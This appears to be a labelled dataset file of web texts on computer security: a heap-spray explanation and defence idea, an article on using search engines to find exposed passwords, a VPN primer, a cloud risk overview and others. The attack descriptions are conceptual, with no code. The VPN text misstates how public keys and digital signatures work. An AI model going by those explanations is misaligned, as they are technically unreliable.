{"text": "Making Abstract Data Types Abstract\nAn approach to make systems safe from heap spray attacks\nDoug Tygar is an expert on computer security in the broad sense. It started with his thesis work on building secure operating systems. This work was notable for its unique approach to this fundamental problem, partly driven by the views of his famous advisor Michael Rabin. Since then he has continued working on all aspects of security: including attacks against intrusion detectors themselves, covert channels, and spam and botnet protection.\nToday I want to talk about some attacks on software systems and an attempt to try to model them formally, and perhaps prevent them. This is related to some research of Doug’s, but the ideas here are work still in progress.\nDoug started his career as junior faculty at CMU, where he taught a class on security. One thing about CMU students, in general, they are good “hackers.” Even theory students are known for being able to write code, and the systems students are seriously good.\nAt the start of the class, Doug announced to his students he had a great password and that no one would be able to break it. I am not sure why he challenged the class, but he did. It was not a good idea—do not wave red flags at a bull—or in this case at a class full of them. The game was on.\nIn a couple of days the class had figured out his password. The problem they solved is given a “one-way” function and a string , find a string , the password, so that\nThey had used a standard dictionary based attack: try all the words from some dictionary, and test each to see if . Usually, these programs are a bit more clever and can get a password like “99hello” quite easily.\nThey told Doug his password, and so he changed it to a better one. Game on. This they still cracked, even though it took much more computer time, but they still got it. Now Doug announced to his class that he had picked a password that would foil these simple dictionary attacks.\nBut, he made a small error, he told them how he had selected the password. He wanted a password he could remember, so he used his knowledge of Japanese. He told them he had used a Japanese phrase as his password. He smiled to the class, and told them to forget about trying to crack this password.\nThey decided to attack his password, Japanese or not. Of course he had to write his phrase as a series of roman letters, since the login routine did not accept Japanese characters. There are standard ways to encode Japanese into roman letters, see this; thus, they built their own special dictionary for Japanese phrases. It was a lot of work, but in a week or so, and with some luck, they again broke his password.\nDoug was getting tired of this game of password cracking: he wanted them to work on more important security projects. So he told his class he had changed his password to a random string of letters:\nLet’s move on, I win.\nOf course this was not the end, recall these were CMU hackers. They knew the attacks using dictionaries were out, but there were other ways to get passwords. In those days, this was many years ago, the CMU department was using workstations that allowed users to listen in on all the ethernet traffic on the network. Essentially they could sniff the packets as they went by, whether they were meant for them or not.\nSo they wrote a program that examined each packet. The goal was to find packets that looked like they were part of a remote login. Each time they found one they got a and checked to see if it was Doug’s password. After a few days, a packet went by with his password, and they had him. The key insight was that the operating system did not encrypt passwords when logging into remote machines.\nAfter Doug heard they had his password again, he gave up. Game over. You win. He told them his new password—this stopped all attacks. And the class moved on to more interesting issues concerning the security of systems.\nLet’s move on to a class of interesting attacks on systems.\nOne of the fundamental ways that malware takes over a system is this:\n- First, the malware runs in normal mode and does something legal, but something that will help it break your system. Often this involves writing some data somewhere in memory by legal means.\n- Then, the malware uses some bug, and jumps to a given location in memory.\n- Now, the malware is running its own code and does whatever it wants to do to you.\nThe second step is critical. Without the bug or hole in your system the malware would likely be unable to run the code that it wants to run. However, modern software systems are large, complex, and distributed: all make “preventing the jump” step very hard. Thus, the need for methods that detect or even protect systems from this type of attack.\nIn early attacks the malware could control the jump step—it could decide where to jump to exactly. The software bug that was exploited allowed the malware to jump to a specific location. This made the malware’s job pretty easy: place its code there and jump.\nHowever, as software engineers have become more aware of attacks, there are less predictable ways for malware to take control. Today many bugs allow malware to jump into memory, but not to a specific location. The challenge is simple: given that malware can jump into memory, how does the malware make sure it can jump into its code? It would be useless, from the malware’s point of view, to jump into the middle of legal code or data. Likely, this type of jump might crash the system, but would not allow the malware to take over.\nHence the creation of heap spraying. Sounds like a garden product:\nuse “heap spray” and all your weeds will go away.\nThe idea of heap spraying is simple, since the jump is unpredictable, place many copies of the malware code all over memory. Then, when the jump occurs, there will be a good chance that the malware jumps into its own code.\nThere is one further simple idea to make this work. The malware wants to get to the start of its own code—jumping into the middle is not very useful. So nop sleds are used. Imagine memory is filled with pieces of code like this:\nHere is typically a “nop.” Note, now as long as the jump hits the sequence the malware’s code will get executed properly. Here is an example of how this type of attack looks:\nThe Problem: Abstract Data Types\nI see the problem as: the malware is given legal access to some abstract data type. During the first part of the attack the malware can do any legal operations on the data type. In the above example, the malware just filled an array—legally—with its sled and code. However, later on the malware will do the jump step. This will take it into the memory and perhaps with luck it will hit a nop sled and then execute its malware code.\nThe problem is: the abstract data type is not abstract. A white hat programmer only uses the correct calls to the data type; on the other hand, the malware jumps into the middle of the data type. This is an abuse of the data type, and is how the malware gets control of the machine.\nHere is a “solution” to the heap spray problem based on the use of theory type ideas. I say “solution” for the following reason: unless the exact attacks are clearly defined the solution can still fail—more on this later on. I do think, however, that ideas from theory could easily play a bigger role in the security of modern systems.\nI will explain the idea for the simple data type of a one-dimesional array of integers. Imagine some scripting language that hat allows programs to access arrays. They can execute to write the array value, and execute to read the array value.\nThe implementation of the array type is changed very slightly. I need to explain how it is created, read, and written.\nCreate Array: A random value integer is selected. The array is set up as usual: let denote the memory locations where the array is stored.\nWrite Array: Suppose is to be written into . Then, execute\nRead Array: Suppose is to be read from . Then, execute\nand return the value .\nThe point of this is the values stored in the actual memory are not the “raw” values sent to the data type. They are scrambled to make them appear random. Clearly, a jump now will hit,\nThus, a malware program that fills memory with nop sleds and then jumps is likely to hit random garbage. This may cause an exception or even a crash, but will unlikely allow the malware to take over the system.\nDoes This Work?\nI believe the above is a pretty good “solution.” However, it could be defeated if the array allows access to undefined locations. This shows how careful one must be in designing such “solutions.” I think whether this particular idea is useful or not is less important than the idea that we may be able to use crypto like methods to protect software.\nThe malware could learn the value of as follows. It would access some yet-undefined location and get back where was the value left in the location. For example, if , then the malware would learn , and this would defeat the method. Even if were arbitrary, the malware could use this approach to try to learn the secret random value .\nTo avoid this attack there are at least two methods. We could assume that the data type does not allow the access of undefined values. It can return “undefined value,” but must monitor whether a location is defined or not. The other possibility is to use a more complex crypto solution. The advantage of the latter is the data type need not watch and check that no read occurs to a location that is undefined. I will discuss this method and related issues in a later post.\nStopping Heap Spray—Other Approaches\nThere are several other methods for protecting against heap spray attacks. One project is called Nozzle and is work of Paruj Ratanaworabhan, Benjamin Livshits, and Benjamin Zorn of Microsoft. This method is really an intrusion detection method: it watches the memory and reports if it detects the presence of objects that contain executable code. One problem with this method is the existence of false positives. They note that often data stored by programs is legal code.\nAnother project is called BuBBle and is the work of Francesco Gadaleta, Yves Younan, and Wouter Joosen. They use a method very close to one I am suggesting. They replace parts of memory by random pieces—these random pieces cause the memory left by the attacker to be gone. This will cause the malware to cause an exception when it attempts to execute that part of memory. One problem is they only modify some of memory, and second is they need additional storage for the actual values of the modified memory.\nCan theory help in other ways in building secure operating systems? Does the idea here have any use in fighting heap spray attacks? Can we use more crypto in making secure systems?", "label": 1}
{"text": "Endpoint Authentication Types\nThe process for endpoint authentication involves granting permissions to allow users to connect to endpoints that are created on the server and specifying how authentication is performed.\nHow authentication is performed is specified by using the AUTHENTICATION clause of the CREATE ENDPOINT statement or the ALTER ENDPOINT statement. The AUTHENTICATION clause provides the following options for specifying the authentication type:\nAnonymous authentication on an endpoint is not supported. For user access to an endpoint, the user must be a valid authenticated Windows user, either a trusted Windows user or a member account on the local computer.\nBasic authentication is one of the two required authentication mechanisms in the HTTP 1.1 specification. Basic authentication is made up of an Authentication header that contains the base64-encoded user name and password separated by a colon. For more information, visit http://www.ietf.org/rfc/rfc2617.txt.\nConsider the following when you specify BASIC:\nThe PORTS value cannot be set to CLEAR.\nCredentials sent as basic HTTP authentication must be mapped to a valid Windows login.\nBasic authentication should only be used as a last resort. Because it uses easily decoded base64-encoding, if basic authentication is specified, the instance of SQL Server requires that a Secure Sockets Layer (SSL) port be used for HTTP connection. Basic authentication can be used in situations in which the user that is granted permissions to the endpoint is a local user on the server computer itself.\nDigest is the second authentication mechanism required by HTTP 1.1. This authentication is made up of the user name and password. This is then hashed with MD5, a one-way hashing algorithm, and sent to the server. The server has access to either the raw password, or a stored MD5 hash that was created when the password was set. The server can then compare the stored calculated value to the one provided by the client. This way, the client can prove that it knows the password without actually giving it to the server. For more information, visit http://www.ietf.org/rfc/rfc2617.txt.\nThe credentials sent as part of a digest authentication over HTTP must be mapped to a valid Windows domain account. Local user accounts are not supported for Windows-based digest authentication.\nFor security reasons, Windows-based digest authentication only supports MD5-sess encryption over domain controllers that are running under Windows Server 2003.\nNTLM is the authentication mechanism supported by Windows 95, Windows 98, and Windows NT 4.0 (client and server). This authentication mechanism is a challenge-response protocol that offers stronger authentication than either basic or digest. NTLM is implemented in Windows 2000 and later versions by a Security Support Provider Interface (SSPI). For more information, see Microsoft NTLM.\nKerberos authentication is an Internet standard authentication mechanism. Kerberos authentication is supported in Windows 2000 and later versions by an SSPI.\nWhen Kerberos authentication is used, the instance of SQL Server must associate a Service Principal Name (SPN) with the account it will be running on. For more information, see Registering Kerberos Service Principal Names by Using Http.sys.\nFor more information about Kerberos authentication, see Microsoft Kerberos.\nEndpoints configured to support integrated authentication can respond with either of the following authentication types as part of the authentication challenge: Kerberos or NTLM.\nUnder this configuration, the server will try to authenticate the client with whichever type the client uses in requesting authentication.\nIf that process fails for one integrated authentication type, the server will terminate the connection for the client. The server does not fall back to trying the other authentication type.", "label": 1}
{"text": "This week, Intel unveiled its new Xeon Phi coprocessor, which puts an astonishing 50 x86 cores onto a single PCI-connected card. The term \"coprocessor\" should be understood in context. Every one of the Phi's cores can boot Linux and run any x86 software. However, the card itself needs to plug into a system that has an independent CPU, which basically oversees the Phi's operations. Hence, the coprocessor appellation. The first model to be released in Q1 of next year will have 50 cores, and the follow-up coprocessor slated for release in mid-2013 will have 60 cores. Each processor supports four threads, making for 200 threads for the initial Phi. The cores run at 1.05 GHz and sport a 512-KB L2 cache each. They collectively share 8 GB of GDDR5 memory.\n- Transitioning to Multicore Development\n- Crime Prediction and Prevention: A Safer Public through Advanced Analytics\nThe aim of these processors is initially to attack tasks that are highly threadable. The Phis compete most directly with GPU processors, especially those from Nvidia. Even though they offer fewer threads than do GPUs, they deliver compelling programming advantages. If you've used CUDA or OpenCL, you know that programming GPUs is a descent into a netherworld of peculiar and rigid limitations. You're always acutely aware that you're doing something that the processor was not built to do. For example on Nvidia chips, there are multiple kinds of memory and only certain things can be done with each type of memory. Moreover, data has to be presented for calculation very carefully; otherwise, the processing lift of the GPU will disappear entirely. All of these problems go away with the Phi. It's a pure x86 programming model that everyone is used to. It's a question of reusing, rather than rewriting, code. This greater simplicity will be extremely appealing to many users who have spent long nights hacking code to get the GPUs to deliver properly. (The OpenACC initiative that we've covered several times recently is an industry effort to deal with this complexity.) The Phi can be programmed using all the typical parallel approaches: OpenMP, MPI, and Intel's own TBB and Cilk+. Intel has added some extensions to OpenMP to do the data offloading from the CPU to the Phi, but the company expects that the directives will be included in the upcoming OpenMP 4.0 spec.\nThe coprocessor consumes around 225 W of power, which is a surprisingly low number given the number of cores. The heat generated when the Phi is running is low enough that the device can be passively cooled. As I mentioned, the Phi comes as a PCIe 2.0 card. The PCI connection means that the data transfer process from the CPU to the GPU is a limitation (as it is on GPU computing devices) because, at full tilt, it can transfer a maximum of 16 GB/sec. (By comparison, the Phi cores access the 8 GB of internal memory at 320 GB/sec.)\nSuggested reatail pricing for the initial model is $2649, with subsequent models expected to cost less than $2000. At this pricing level and with the ability to run x86 code without rewriting, the Phi most directly disrupts Nvidia's CUDA project and AMD's OpenCL work. At the moment, both Nvidia and AMD enjoy a price advantage in their GPU coprocessors, but it's not clear that the advantage is substantial enough that sites will continue preferring those solutions in light of the cost of rewriting code to run on their GPUs. Intel is leveraging its massive x86 installed base.\nI expect Phis to show up initially exactly where the GPUs are mostly used today for computation: in servers used by academia, research, and high-volume data transformation. Eventually, though, I expect the coprocessors to move down to workstations and subsequently to high-end desktops.\nAn oft-asserted but dubious contention made in the popular press is that desktops today are so powerful that they are effectively supercomputers. Abstractly, this might be true if you compare them with their forbears of some years ago on computing power alone. However, supercomputers have (for well over a decade) been primarily highly parallel designs. Thus, the metaphor lacks a key elements it strives to express. However, with the advent of Intel's Phi coprocessor, this gap is closed and indeed we can expect to have true supercomputing power on servers and desktops soon at a price everyone can afford. As such, the Phi heralds a new era in computing.", "label": 1}
{"text": "How to stay safe on the web\nThere are all kinds of scams, viruses and other dangers out there. Here are simple steps you can take to protect your computer and personal information.\nTable of Contents\nKeep your software and operating system up-to-date\nSoftware updates contain vulnerability patches that protect your computer and personal information.\n- Update Firefox: To check for Firefox updates, go to the top of the Firefox window, click the menu and select .To check for Firefox updates, go to the top of the Firefox window and click the button, go over to the menu and select .To check for Firefox updates, go to the menu bar, click the See menu and select .Update Firefox to the latest version for details.\n- Update your plugins: Go to our Plugin Check page and follow the links to update any plugins that are out of date.\n- Update WindowsUpdate OS XUpdate your system: Make sure you have all of the latest security and stability fixes. Go to the menu, select and then .Go to the menu and select .Go to the menu, down to and select .\nCheck your Firefox settings\nFirefox has many ways to help you stay safe on the Web.\n- How do I tell if my connection to a website is secure?\n- Disable third-party cookies in Firefox to stop some types of tracking by advertisers\n- Create secure passwords to keep your identity safe\n- Where are my logins stored?\n- There are also a lot of Firefox extensions that may be helpful.\nFollow best practices to protect your information\nHere are some handy tips to protect yourself.\n- Remember that YOU decide what information about yourself to reveal, when, why, and to whom: don't give out personally-identifiable information too easily; set your privacy settings in your social networking account; beware of sites that offer some sort of reward or prize in exchange for your contact information or other personal details.\n- Be conscious of Web security: never submit a credit card number or other highly sensitive personal information without first making sure your connection is secure; be on the lookout for \"spyware\"; use secure passwords and protect them with a master password.\n- Keep a \"clean\" e-mail address: use some pseudonymous or simply alternate address, and keep your main or preferred address only on small, members-only lists and with known, trusted individuals.\n- Do not reply to spammers, for any reason.\n- Realize you may be monitored at work: avoid sending highly personal e-mail to mailing lists, and keep sensitive files on your home computer.\n- Be conscious of home computer security: Turn off your computer when you are not using your Internet connexion; secure your Wi-Fi network with a strong encryption (WPA or WPA2) ; use a firewall.", "label": 1}
{"text": "A firewall is a set of related programs, located at a network gateway server, that protects the resources of a private network from users of other networks. (The term also implies the security policy that is used with the programs.) An enterprise with an intranet that allows its workers access to the wider Internet installs a firewall to prevent outsiders from accessing its own private data resources and for controlling what outside resources its own users have access to.\nBasically, a firewall, working closely with a router program, filters all network packets to determine whether to forward them to their intended destination. A firewall also includes or works with a proxy server that makes network requests on behalf of workstation users. A firewall is often installed in a specially designated computer separate from the rest of the network so that no incoming request can get directly at private network resources.\nThere are a number of firewall screening methods. A simple one is to screen requests to make sure they come from acceptable (previously identified) domain names and IP addresses. For mobile users, firewalls allow remote access in to the private network by the use of secure logon procedures and authentication certificates.\nHubs, Switches and Routers\nHubs, Switches and Routers are all devices that direct data between computers and other devices on your network. They come both in the standard CAT5 or CAT6 connection and wireless, which is able to relay data to your more mobile devices.\nNetwork cards fit in computers, laptops and printers to connect them to the rest of the network. Most network cards use a direct connection using a CAT5 cable, similar to a telephone cable. For laptops and mobile devices such as Pocket PC's and Palm Pilots, or in areas that installing network cables might be costly or dangerous, it may be beneficial to use wireless network cards.", "label": 1}
{"text": "Computer hackers have adopted a startling strategy in their attempts to break into websites. By using the popular search engine Google, they do not have to visit a site to plan an attack. Instead, they can get all the information they need from Google's cached versions of web pages, say experts in the US.\nOne way that hackers can break into a website is by hunting for private pages that contain the usernames and passwords required to access secure parts of the site. These pages are usually hidden from the casual browser because there are no hyperlinks to them on the web.\nBut sometimes websites contain hidden hyperlinks or indexes that point to these private sites. These links may be inserted by faulty software, or they may be created by the owner for temporary use and later forgotten or not properly deleted. Either way, they are serious security loopholes.\nHackers usually hunt for these private pages by trial and error, an activity that an alert webmaster can spot by monitoring traffic on supposedly private parts of the site. But search engines now make this kind of trawling unnecessary, says Johnny Long, a professional hacker based in the US who is hired by companies to test their security.\nSearch engines build their databases by systematically following the links they find on web pages. The search engine then records the contents of each page. So if a website contains a link to a sensitive page, a search engine will record it.\nThese pages would still be hard to find if web servers did not often use the same name for pages that contain passwords and other sensitive information. For example, one common filename for passwords is \"bash history\". Long says an obvious combination of search terms would include the terms \"bash history\", \"temporary\" and \"password\".\nSince Google makes its cached pages available, hackers can access this information without alerting a webmaster, even if the data has since been removed from the web. Long plans to outline the technique this week at Defcon, the annual hackers' conference in Las Vegas.\nGoogle says it bears no responsibility for the way the information it collects is used. \"Our search tools are very useful to researchers. There is not a lot we can do to prevent hacking,\" says a company spokesman.\nThe responsibility for securing a site lies with the people operating it, says Danny Sullivan, editor of the website SearchEngineWatch.com: \"Search engines make it easier for everyone to gain information, hackers included.\"\nIf you would like to reuse any content from New Scientist, either in print or online, please contact the syndication department first for permission. New Scientist does not own rights to photos, but there are a variety of licensing options available for use of articles and graphics we own the copyright to.\nHave your say\nOnly subscribers may leave comments on this article. Please log in.\nOnly personal subscribers may leave comments on this article\nAll comments should respect the New Scientist House Rules. If you think a particular comment breaks these rules then please use the \"Report\" link in that comment to report it to us.\nIf you are having a technical problem posting a comment, please contact technical support.", "label": 1}
{"text": "Securing Virtual Private Networks (VPN), Page 2\nAsymmetric Encryption, or public key encryption, depends on a pair of keys called public key and private key; hence the name. The keys are selected such that, if data is encrypted through key 1, it can be only decrypted through key 2 and vice versa. Of the two keys, we tell about one to everybody and call it a public key. The other is kept private for decrypting and called a private key. For example, our e-mail account has a public e-mail address that we give to everyone we want to but we won't tell the password to anyone.\nSuppose a person named Linda is a broker and she gets a request mail by James Anderson for buying some stock shares for his company. She performs all the arrangements and sends a confirmation mail to James. In the end, she sends a bill to him for the payment; at this point, James completely denies that he has ever sent a mail to Linda for any stock shares. Now what should Linda do? She is in extreme trouble because there is no clue to prove that James was the actual e-mailer.\nThe solution is provided by the use of public key encryption; if Linda has encrypted the data by a public key, it can be decrypted only through Linda's private key which should be told only to James, so when James replies to the confirmation mail for the shares, it is known for sure that the answering person is no other then James Anderson and he is caught. This is source authentication.\nIf we use the hashing scheme, such as MD5, on our data and generate a hash value for it at the source computer and send it along the data to the target, the destination computer will also compute its hash code for the received data. If the hash generated by the destination is same as the one received by the source, our data integrity is preserved; in other words, the data has reached its destination without any change or loss. This hash code is called a digital signature when sent with e-mail data.\n- Data Integrity\n- Data origin authentication\n- Replay prevention\n- Limited traffic flow confidentiality\nReplay prevention means that if somebody gets to know the keys by some means and resends your messages again or if someone gets to know the user name and password of your account, he or she can directly learn all your important business transactions and deals with others and can enjoy full authority to make other deals with them on your account using your name.\nIKE is a mechanism in IPSec where we exchange the key. It is a hybrid protocol that implements Oakley and Skeme key exchanges inside the ISAKMP framework. While IKE can be used with other protocols, its initial implementation is with the IPSec protocol. IKE provides authentication of the IPSec peers, negotiates IPSec keys, and negotiates IPSec security associations. The main features of IKE are as follows:\n- Negotiates policy to protect communication\n- Authenticated Diffie-Hellman key exchange\n- Negotiates (possibly multiple) security associations (SA) for IPSec.\nDiffie-Hellman is a public-key cryptography protocol that allows two parties to establish a shared secret over an unsecured communication channel. Diffie-Hellman is used within IKE to establish session keys. 768-bit and 1024-bit Diffie-Hellman groups are supported.\nSecurity Association (SA) combines the agreed upon principles for VPN communication. This is done by IKE. The secret key exchange is the main process so that the dependent data to be delivered is secured.\nIsakmp + oakley is the IKE policy that we define to start the encryption process. The Internet Security Association and Key Management Protocol (isakmp) is a protocol framework that defines payload formats, the mechanics of implementing a key exchange protocol, and the negotiation of a security association. Oakley is a key exchange protocol that defines how to derive authenticated keying material. Skeme is a key exchange protocol that defines how to derive authenticated keying material, with rapid key refreshment.\nMD5 (Message Digest 5) is a hash algorithm used to authenticate packet data. HMAC is a variant that provides an additional level of hashing. The Data Encryption Standard (DES) is used to encrypt packet data. IKE implements the 56-bit DES-CBC with Explicit IV standard. Authentication header is used for data integrity and source authentication whereas encapsulating security protocol is used for confidentiality.", "label": 1}
{"text": "Security in the Cloud\nSecurity risks are a concrete expression of the lack of control a business faces when considering moving critical business systems to the cloud. From the perspective of the enterprise, there are seven major risks to be considered. Of these seven, four can be easily controlled or mitigated by the Enterprise. The remaining three remain the responsibility of the cloud provider of which the Enterprise has little real control, other than voting with their wallet. It may be argued that the Enterprise should make “demands” of the cloud provider through the use of contracts or third party audits, but in reality the market will determine the amount of security provided to Enterprises by cloud service providers and the level of acceptable risk. It may turn out that the cheaper price of cloud computing comes with necessarily increased risk, which may be a self-limiting factor in itself to the pervasive use of cloud computing by Enterprises.\nWe outline the top security risks as follows:\n1. Insecure, Porous APIs: Most cloud services offer two categories of web-accessible APIs: Those based on web services (called SOAP) and those based on pure HTTP (called REST). Increasingly, some cloud providers are offering only REST style APIs which lack robust “Enterprise class” message level security and authentication mechanisms. Some APIs, such as the Twitter API are purposely designed for rapid development and allow and even encourage the use of unprotected user credentials which are more susceptible to man in the middle or replay attacks. While some providers, such as Amazon.com offer strong authentication mechanisms, it’s not clear yet how well these APIs stand up to content-based threats such as code injection, denial of service attacks, script injection, or malicious XML content. Moreover, it’s also not clear how much trust should be placed in data received by the Enterprise from a cloud API for potential threats. A compromised cloud service API session may be a direct avenue for an attack. Internal information systems exposed to the cloud at the API layer offer a universal tunnel for a savvy attacker. Without explicit protection, cloud APIs essentially expose previously guarded Enterprise data across the Internet into the hands of a third party. Moreover, for IaaS systems that expose XML based APIs for image management, these management APIs also require strong authentication and access control as an attacker may conveniently replace a trusted machine image with a rouge one.\n2. Logical Multi-Tenancy: With shared cloud computing infrastructure, the division of Enterprise data is now logical rather than physical. This logical separation is typically achieved through the use of virtualized infrastructure which is a cheap and easy way to support a multi-tenant architecture at the cloud service provider. The perceived risk in this scenario is for an attacker to subvert the logical division provided by the guest virtual machine and gain access to the data of another tenant. A number of attacks on virtual machines, from detecting the presence of a hypervisor to running arbitrary code on the host have been documented3. These attacks highlight the uncertain security of multitenant, shared environments for critical Enterprise data. An Enterprise horror story would be an attacker signing up for a “free” account at the cloud service provider, detect the presence of a virtual machine and “escape out” of the VM instance to access the physical server operating system and potentially gain access to the Enterprise data. Technology such as Intel® Trusted Execution Technology (TXT) are available that can mitigate this type of attack, but responsibility for implementation ultimately still lies with the cloud service provider.\n3. Data Protection and Confidentiality: Data stored, processed or indexed in a remote cloud service defines the extent of the new perimeter for the Enterprise. This new “fuzzy” boundary changes and moves with the data itself, not the traditional firewall. A necessary complication here is that for data to be used effectively by cloud services it must remain unencrypted or else SaaS providers will have a hard time indexing it for any function that relies on search. Common examples include spell-checking in a Google document or looking up sales leads in a CRM application. The Enterprise may have to give up encryption and data privacy requirements for some of its data but should also recognize the option of applying selective field or message level protection mechanisms for data before it reaches the cloud. A practical example of this is protecting employee or critical customer information on messages before the data is released to the cloud. This is one aspect of data protection that an Enterprise can control on data before it reaches the cloud service provider.\n4. Data Loss and Reliability: When critical business data is moved to a cloud service, there is some inherent risk of data loss. Even if cloud service vendors offer multiple back-ups and data redundancy, there is no perfect way to protect against the failure of physical media and disasters are apt to strike at just the wrong time. To take an example, services such as Amazon’s storage service offer “credits” in the face of data unavailability4 within a given month. This SLA may be too weak a proposition for business critical data and Enterprises may need more protection to manage this risk. Data loss and unavailability at precisely the wrong time may completely cripple an Enterprise. It may be argued that this is a false risk because the Enterprise has a similar risk of catastrophic data loss inside its own datacenter and simply moving the data to the cloud doesn’t change the equation. This claim ignores the fact that the cloud service provider is offering the same product at a much cheaper price and the reliability that the Enterprise has built around its data may simply not be present with the cloud service provider. It should be noted that this risk may turn out to be a red herring. The convenience and cost savings of the cloud service and record of actual failures may reduce this potential risk to near-zero, but it is too early to tell.\n5. Audit and Monitoring: The first step in managing the security of any system to know when specific risky events occur. If an Enterprise decides that cloud services provide value to the Enterprise but wants to audit when these services are accessed to evaluate risk, it needs a way to know when data flows to and from the cloud. Enterprises need to know who is making the service request, when the request is happening, how much data is sent or received and how the data is used. Given the convenience and ease with which cloud service providers can be accessed the biggest risk to an Enterprise concerns the use of unmanaged “rogue” cloud services or projects that go unnoticed or unmanaged by the Enterprise CSO.\n6. Cloud Provider Insider Threats: A potential problem or weak spot with cloud services is the mismatch between the security requirements inside the Enterprise as compared to those employed by the cloud service provider. To take an example, many large Enterprises make special efforts to secure “endpoint” data on IT-issues laptops with two-factor authentication technology, forced password rotation and fully encrypted hard-disk drives. Moreover, data is often segmented with access controls that distinguish between full employees and contractors, especially in large companies with diverse geographies. In most cases these controls increase the security of the Enterprise data. It should be noted that has taken Enterprises many years to reach this level of increased protection. Once the data is moved from protected assets to the cloud, however, an instant “weak spot” is created. Security breaches are often breaches of the weakest link, and a determined attacker motivated either by financial gain or industrial espionage will likely find it easier to execute an insider threat from the cloud service provider to gain access to the Enterprise data rather than try to execute a brute force attack on an encrypted hard disk. It should be noted that this is not the same as “hacking into Amazon’s API” or “hacking Google documents.” Sophisticated attackers use social engineering techniques and insider connections to find the weakest link. A motivated attacker may even take a low level job at the cloud provider itself if it provides an easier path to the Enterprise data.\n7. Account Hacking, Tiered Access Control and Authorization: While hacking an account through a stolen password or compromised credential is nothing new, Enterprises to date have done a decent job of segmenting credentials and access control throughout their infrastructure. This is actually a property or benefit of the somewhat localized security inherent in individual operating systems and the uses of role based (RBAC) and attribute based access control (ABAC) within the Enterprise. In other words, if an attacker gains root access to a networked system or database they may have access to other assets, but the breach of a single system is more often than not directly localized to the breached system. Further, breaches of a single account are self-limiting by the role or attributes associated with that account in the Enterprise LDAP system. It is true that sophisticated attackers can use information from any compromised system as a stepping stone for more sophisticated attacks, but more work is required by the attacker unless they are extremely lucky in breaching the exact system they need. If we contrast this to cloud service providers, a few such as Salesforce.com have rudimentary segmented access control and privileges5, but for the majority of these a breach of one account may grant the keys to the entire castle. In fact, the pay-off for an attacker who knows that he must hack just one account to gain access to all of the Enterprises resources may seek to employ cheap, readily available cloud computing resources for brute force attacks on passwords and cryptographic keys. Moreover, fine-grained authorization of Enterprise resources is a problem just now being solved inside the Enterprise and it will be some time before cloud providers reach the same sophistication of locking down the use of individual data elements, fields, URIs, resources or API calls to individuals with a specific role or specific attributes. Account hacking from an Enterprise insider also needs to be considered. Once the Enterprise moves to cloud computing traditional insider attacks can be more costly because the Enterprise must rely on the cloud provider to help prevent the insider breach. In short, not only are the keys to the castle held in the cloud, but the Enterprise has to protect its traditional assets and now cloud assets from insider attacks.\nThe previous seven risks are summarized in Table 1. Here we list the risks, a description of the threat and which party (Enterprise or Cloud Provider) is on the hook for reducing the threat. Ultimately, shoring up security risks is the job of both the Enterprise and the cloud providers. Short of a boycott, however, Enterprises have little real control over how security is implemented on the provider side. Cloud providers have yet to segment their offerings to provide increased levels of security targeted for Enterprise requirements such as higher levels of risk protection, integration with Enterprise identity systems, guarantees around multi-tenancy platform sharing (or isolation) and integration with monitoring, alerting and security event management systems. Instead, providers appear to be implementing minimum levels of security for their perceived target market. Whether this minimum security will rise as the industry matures is an open question, but for Enterprises that need to reduce risk while cautiously adopting cloud services we advocate the use of a high performance edge-oriented service gateway for those categories of risk that the Enterprise can control. This provides the necessary balance between the cost savings promised by cloud computing and the management of tangible risks that are under the Enterprise control. The next section outlines the concept of a service gateway and how it can reduce risk in four areas: (a) API protection and strong authentication, (b) Data protection and leakage, (c) Auditing and Monitoring, (d) Access Control and Authorization.", "label": 1}
{"text": "Security and Performance Issues\nThe dangers of computer viruses are often discussed, but you may not be aware of\nother hazards that can jeopardize your privacy, damage your files, and cause frustrating\nFortunately, implementing some simple strategies can not only secure your computer\nand keep your data safe, but can make your computer work faster and more efficiently.\n- Reviews the risks for a computer with excessive clutter, speed and performance\ndrains, insufficient security protection, and corrupted settings.\n- Suggests repairs and preventative measures that can both protect your computer\nand improve its speed, stability, and efficiency.\n- Provides definitions of key computer and security terms.\nSecurity and Performance Terms Defined\nRisks posed by unneeded files\nEvery time you work on your computer or browse the Internet, temporary files, cache\nfiles, and cookies are saved to your hard drive. Most of these are files that you\nwill never use and do not need to save. More unneeded buildup occurs from deleted\nfiles accumulating in the Recycle Bin. All this debris clutters your computer and\novertaxes its resources.\n- Reduction in processing. Unneeded files consume memory and take up drive\nspace. Instead of focusing on processing the services you really need, your computer\nis using resources to process useless items.\n- Recurrent crashes and lock-ups. A glut of unnecessary files increases drive\nfragmentation, which burdens the hard drive. With an excessive amount of debris,\nWindows can start to behave in unusual ways, including locking up or crashing.\n- Endangered privacy. Anyone who has access to your computer can see the\nWeb sites you have visited and easily open files you have deleted.\n- Erase temporary files. Simply deleting files from your Web browser cache\nor temporary directories does not completely erase these tracks. Most security advisers\nrecommend using software that can thoroughly clean out cookies, temporary Internet\nfiles, and cache files.\n- Empty the Recycle Bin. Windows stores deleted items in the Recycle Bin\nfor easy recovery, and as you work on your computer, these deleted files quickly\naccumulate. Periodically empty the Recycle Bin to reclaim valuable hard drive space.\nNote: Items left in the Recycle Bin also pose a privacy risk because these files\ncan be easily retrieved. Where confidentiality is critical, not only empty the Recycle\nBin, but also use a data wiping program to thoroughly obliterate data.\n- Remove unneeded files and programs. Occasionally review the data you have\nsaved and installed. Delete the documents and files you no longer want and uninstall\nprograms you are no longer using. Consider archiving rarely used files to a CD or\nother removable media.\nRisks posed by speed and performance drains\nVarious inefficiencies can bring your computer’s processing to a crawl, including\nfragmented hard drives, splintered system memory, scattered registry entries, and\nunneeded programs starting with Windows.\n- Slow boot times. Various programs and services are set to load when Windows\nloads. Some of these programs, such as antivirus protection, are desired, but many\nare useless and needlessly slowing the time it takes to start your computer.\n- Reduction in processing. When hard drives and system memory become fragmented,\ncomputer performance is significantly slowed. Files take longer to open and programs\ntake longer to start.\n- System and file damage. Highly fragmented files are more prone to becoming\ncorrupt. A highly fragmented hard drive places more strain on the heads, which in\nsevere cases can lead to a head crash and a loss of data.\n- Exposure to infections. Trojans (malicious software) might also be loading\nat startup. Trojans are usually designed to load when you restart your computer.\n- Defragment your hard drive and system memory. Defragmenting your hard drives\nreorganizes scattered data, which boosts file access speed and extends the life\nof the drive. Defragmenting system memory reclaims valuable memory and improves\nPC efficiency and speed.\n- Compact the registry. Compacting the registry reorganizes entries, which\nmaximizes free space and improves the efficiency and speed of registry processing.\n- Remove unneeded services from startup. Eliminate startup items that are\nunnecessary. Removing these unneeded performance drains will boost your PC’s speed,\nparticularly the time it takes to boot, and will eliminate potentially dangerous\nRisks posed 